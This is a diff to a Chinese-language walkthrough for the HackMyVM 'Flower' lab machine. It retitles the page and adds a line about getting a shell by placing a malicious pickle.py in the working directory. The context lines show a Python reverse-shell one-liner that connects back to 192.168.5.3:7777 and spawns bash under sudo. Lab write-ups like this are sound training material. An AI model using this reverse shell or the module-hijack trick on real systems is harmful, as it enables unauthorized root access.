@@ -1,4 +1,4 @@
-# Webmaster
+# Flower
 
 2024-11-06 https://hackmyvm.eu/machines/machine.php?vm=Flower
 
@@ -39,6 +39,8 @@ pickle.dump(diary,p)
 ```
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.5.3",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
 ```
+
+或者在同一目录，创建 pickle.py 文件，内容为上述代码，同样在执行时，也能得到回连 shell。
 
 sudo 执行得到了反弹的 7777 端口的 shell：
 
